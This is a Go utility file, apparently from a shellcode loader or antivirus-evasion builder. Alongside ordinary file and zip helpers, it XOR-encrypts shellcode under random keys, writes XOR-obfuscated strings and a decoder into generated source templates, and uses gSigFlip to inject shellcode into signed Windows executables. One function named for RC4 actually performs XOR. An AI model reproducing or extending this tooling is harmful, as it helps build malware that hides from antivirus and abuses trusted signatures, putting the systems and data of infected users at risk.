package utils

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"text/template"
	"time"

	"github.com/akkuman/gSigFlip"
)

// FileData 文件数据信息
type FileData struct {
	Name string
	Body []byte
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/")

func RandStringRunes(n int64) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func RandInt63(from int64, to int64) int64 {
	if to <= from || to <= 0 {
		to = 100
		from = 10
	}
	return rand.Int63n(to-from) + from
}

func PathExist(name string) bool {
	if _, err := os.Stat(name); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func GetExecutableDir() string {
	ex, err := os.Executable()
	if err != nil {
		return ""
	}
	exPath := filepath.Dir(ex)
	return exPath
}

// XorEncryptDecrypt 异或加解密
func XorEncryptDecrypt(input, key []byte) (output []byte) {
	for i := 0; i < len(input); i++ {
		output = append(output, byte(input[i]^key[i%len(key)]))
	}
	return output
}

// CopyFile 拷贝文件
func CopyFile(src, dst string) error {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destination.Close()
	_, err = io.Copy(destination, source)
	if err != nil {
		return err
	}
	err = destination.Sync()
	return err
}

// CopyDir 拷贝一个目录到另一个目录
func CopyDir(src, dst string) error {
	err := filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		relPath := strings.Replace(path, src, "", 1)
		if relPath == "" {
			return nil
		}
		dstPath := filepath.Join(dst, relPath)
		if info.IsDir() {
			return os.Mkdir(dstPath, 0755)
		}
		return CopyFile(path, dstPath)
	})
	return err
}

// CustomEncryptData 私有的文件加密逻辑
func CustomEncryptData(data []byte) []byte {
	keyLen := RandInt63(10, 100)
	key := RandStringRunes(keyLen)
	buf := new(bytes.Buffer)
	encryptShellcode := XorEncryptDecrypt(data, []byte(key))
	binary.Write(buf, binary.LittleEndian, uint64(keyLen))
	binary.Write(buf, binary.LittleEndian, []byte(key))
	binary.Write(buf, binary.LittleEndian, uint64(len(encryptShellcode)))
	binary.Write(buf, binary.LittleEndian, []byte(encryptShellcode))
	return buf.Bytes()
}

// ZipData 压缩数据
func ZipData(files []FileData) (zipPath string, err error) {
	f, err := ioutil.TempFile(os.TempDir(), "tmp-*.zip")
	if err != nil {
		return "", err
	}
	defer f.Close()
	zipWriter := zip.NewWriter(f)
	defer zipWriter.Close()
	for _, file := range files {
		zipFile, err := zipWriter.Create(file.Name)
		if err != nil {
			return "", err
		}
		_, err = zipFile.Write(file.Body)
		if err != nil {
			return "", err
		}
	}
	return f.Name(), nil
}

// CryptStringToBytesRc4 采用rc4加密一个字符串，返回加密后的数据和rc4key
func CryptStringToBytesRc4(s string) (data []byte, key []byte) {
	bs := []byte(s)
	keyLen := RandInt63(10, 100)
	key = []byte(RandStringRunes(keyLen))
	data = XorEncryptDecrypt(bs, key)
	return
}

// bytesToIntStr []byte{123, 456} => []string{"123", "456"}
func bytesToIntStr(bs []byte) (ss []string) {
	for i := range bs {
		ss = append(ss, strconv.Itoa(int(bs[i])))
	}
	return ss
}

// TplFuncCryptStr 模板函数：将 "A" 生成类似于 string(xorEncode([]byte{}, []byte{}))
func TplFuncCryptStr(s string) string {
	data, key := CryptStringToBytesRc4(s)
	dataStr := strings.Join(bytesToIntStr(data), ", ")
	keyStr := strings.Join(bytesToIntStr(key), ", ")
	return fmt.Sprintf("string(xorEncode([]byte{%s}, []byte{%s}))", dataStr, keyStr)
}

// TplStrXorEncode 返回xorEncode函数的字符串
func TplStrXorEncode() string {
	return `
func xorEncode(input, key []byte) (output []byte) {
	for i := 0; i < len(input); i++ {
		output = append(output, byte(input[i]^key[i%len(key)]))
	}
	return output
}
`
}

// TplBytes : 将byte数组填充为模板中的字符串
func TplBytes(bs []byte) string {
	s := strings.Join(bytesToIntStr(bs), ", ")
	return fmt.Sprintf("[]byte{%s}", s)
}

// UpdateTplFile 根据所给的tpl文件路径和data以及funcs更新模板文件
func UpdateTplFile(filePath string, data map[string]interface{}, funcs template.FuncMap) error {
	t, err := template.New(filepath.Base(filePath)).Funcs(funcs).ParseFiles(filePath)
	template.ParseFiles()
	if err != nil {
		fmt.Println(err)
		return err
	}
	f, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		fmt.Println(err)
		return err
	}
	defer f.Close()
	err = t.Execute(f, data)
	return err
}

// InjectShllcodeToSignExe 注入shellcode到签名的exe里面去
func InjectShllcodeToSignExe(shellcode []byte, exePath string) (tag []byte, xorkey []byte, err error) {
	var exeBytes []byte
	tag = []byte(RandStringRunes(RandInt63(16, 32)))
	xorkey = make([]byte, 0)
	exeBytes, err = ioutil.ReadFile(exePath)
	if err != nil {
		return
	}
	exeBytes, err = gSigFlip.Inject(bytes.NewReader(exeBytes), shellcode, tag, xorkey)
	if err != nil {
		return
	}
	err = ioutil.WriteFile(exePath, exeBytes, 0777)
	return
}